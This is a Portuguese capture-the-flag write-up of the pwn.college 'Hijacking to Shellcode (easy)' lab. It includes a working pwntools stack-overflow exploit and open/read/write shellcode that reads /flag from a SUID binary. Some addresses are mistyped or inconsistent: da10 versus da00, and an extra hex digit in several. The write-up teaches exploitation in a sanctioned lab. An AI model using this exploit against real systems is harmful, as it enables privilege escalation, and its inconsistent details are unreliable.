# pwn.college — Hijacking to Shellcode (easy)
### Intro to Cybersecurity · Orange Belt · Binary Exploitation

> **Autor:** Pedro Tuttman  
> **Plataforma:** [pwn.college](https://pwn.college)  
> **Categoria:** Binary Exploitation — Intro to Cybersecurity (Orange Belt)  
> **Técnicas:**  Return address overwrite · Stack shellcode injection · Executable stack abuse · SUID privilege abuse · Position-independent shellcode · Direct syscall shellcode

## Descrição do Desafio

Este desafio é uma variação dos anteriores com duas diferenças fundamentais:

1. **Não há região `mmap` separada** — o shellcode não é lido previamente para um endereço fixo
2. **Apenas um único input** — o payload precisa conter tudo: o padding, o novo return address e o próprio shellcode

A estratégia muda completamente: em vez de redirecionar para um endereço mapeado previamente, precisamos redirecionar o fluxo para **dentro da própria stack**, logo após o return address sobrescrito, onde injetamos o shellcode diretamente.

---

## Análise do Binário

### Proteções com `checksec`

![checksec](figuras/checksec-hijacling-shellcode(easy).png)

```
Arch:    amd64-64-little
RELRO:   Full RELRO
Stack:   No canary found
NX:      NX unknown - GNU_STACK missing
PIE:     No PIE (0x400000)
Stack:   Executable
RWX:     Has RWX segments
SHSTK:   Enabled
IBT:     Enabled
Stripped: No
```

Duas diferenças críticas em relação aos desafios anteriores:

- **No PIE** — os endereços do binário são fixos a cada execução. O endereço `0x400000` é sempre o base do binário
- **Stack Executable** — a stack tem permissão de execução! Isso significa que podemos colocar shellcode diretamente na stack e executá-lo — algo que NX impediria nos desafios anteriores

Sem PIE e com stack executável, a exploração fica direta: basta saber o endereço exato da stack onde o shellcode vai ser injetado.

---

## Análise do Stack Frame

![hijacking](figuras/hijacking-shellcode(easy).png)

O binário exibe o stack frame da função `challenge()` e fornece as informações necessárias:

```
buffer começa em:      0x00007fffffffd9d0  (rsp+0x0020)
saved frame pointer:   0x00007ffffffffda00 (rsp+0x0050)
return address:        0x00007ffffffffda08 (rsp+0x0058)
buffer tem 32 bytes
```

O binário também informa explicitamente:

> *"the binary is not position independent. This means that it will be located at the same spot every time it is run, which means that by analyzing the binary (using objdump or reading this output), you can know the exact value that you need to overwrite the return address with."*

### Calculando o offset

```
return address - início do buffer = 0x7ffffffffda08 - 0x7fffffffd9d0 = 0x38 = 56 bytes
```

Confirmado: **56 bytes de padding** para alcançar o return address.

---

## A Estratégia: Shellcode na Stack

Nos desafios anteriores (hijack-to-mmap), o shellcode era injetado em uma região `mmap` com endereço conhecido, e bastava sobrescrever o return address com esse endereço. Aqui não temos essa região — mas temos algo equivalente: **a própria stack é executável**.

A ideia é:

```
payload = [56 bytes de padding] + [novo return address] + [shellcode]
```

O return address é sobrescrito com o endereço **imediatamente após ele na stack** — ou seja, onde o shellcode começa. Quando a função `challenge()` retornar, o processador saltará para esse endereço e executará o shellcode diretamente da stack.

Olhando o stack frame:

```
0x7ffffffffda08  ← return address (sobrescrito)
0x7ffffffffda10  ← aqui começa o shellcode (logo após o return address)
```

O endereço para onde redirecionamos é `0x00007fffffffda10` — 8 bytes após o return address, que é exatamente onde o shellcode começa no payload.

---

## O Payload

![payload](figuras/payload-hijacking-shellcode(easy).png)

```python
from pwn import *

sh = open("shellcode1-raw", "rb").read()

p = process("/challenge/binary-exploitation-hijack-to-shellcode-w")

# Único input: padding + novo return address + shellcode
p.send(b"A" * 56 + p64(0x00007fffffffda10) + sh)
```

O payload em detalhe:

```
[  56 bytes "A"  ] → preenche o buffer até o return address
[ p64(0x7fffffffda10) ] → sobrescreve o return address com o endereço do shellcode
[   shellcode1-raw   ] → shellcode colocado direto na stack, a partir de 0x7fffffffda10
```

Diferente dos desafios anteriores, aqui há **apenas um `p.send`** — não há fase separada para injetar o shellcode, porque tudo vai no mesmo input.

O shellcode utilizado é o mesmo dos desafios anteriores — open/read/write do `/flag` via syscalls diretas:

```asm
mov rax, 2          # open("/flag", O_RDONLY)
lea rdi, [rip + flag]
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax        # read(fd, buf, 0x100)
mov rax, 0
lea rsi, [rip + results]
mov rdx, 0x100
syscall

mov rax, 1          # write(stdout, buf, 0x100)
mov rdi, 1
lea rsi, [rip + results]
mov rdx, 0x100
syscall

mov rax, 60         # exit(0)
mov rdi, 0
syscall

flag:    .string "/flag"
results: .space 100
```

---

## Resultado

![resultado](figuras/resultado-hijacking-shellcode(easy).png)

O stack frame após o overflow confirma:

```
- the input buffer starts at 0x7fffffffd9c0
- the saved frame pointer (of main) is at 0x7fffffffd9f0
- the saved return address (previously to main) is at 0x7fffffffd9f8
- the saved return address is now pointing to 0x7fffffffda00.

Goodbye!
pwn.college{0KkH2MecLShwoDZOuMcnmGbeIkJ.dFjMzwCOzYTNxEzW}
```

O return address foi sobrescrito com `0x7fffffffda00` (endereço logo após o return address na stack), e o shellcode colocado nessa posição foi executado com EUID=0.

---

## Resumo do Fluxo de Exploração

```
1. checksec → No PIE, Stack Executable → endereços fixos, stack executável
2. Binário imprime o stack frame → offset = 56 bytes, return address em 0x7fffffffd9f8
3. Shellcode vai direto na stack, logo após o return address (0x7fffffffda00)
4. Payload: 56x"A" + p64(0x7fffffffda00) + shellcode
5. challenge() retorna → CPU salta para 0x7fffffffda00 (stack)
6. Shellcode executa direto da stack → open/read/write do /flag com EUID=0
```

---

## Comparação com os Desafios Anteriores

| | Hijack to Mapped (Easy/Hard) | Hijack to Shellcode (Easy) |
|---|---|---|
| Onde o shellcode fica | Região `mmap` separada | Diretamente na stack |
| Stack executável | ❌ NX enabled | ✅ Stack Executable |
| PIE | ✅ Enabled | ❌ No PIE |
| Endereço do shellcode | Fixo (fornecido pelo binário) | Lido do stack frame impresso |
| Número de inputs | 3 (shellcode, enter, payload) | 1 (tudo junto) |
| Endereço sobrescrito aponta para | Região mmap | Stack (logo após o ret addr) |
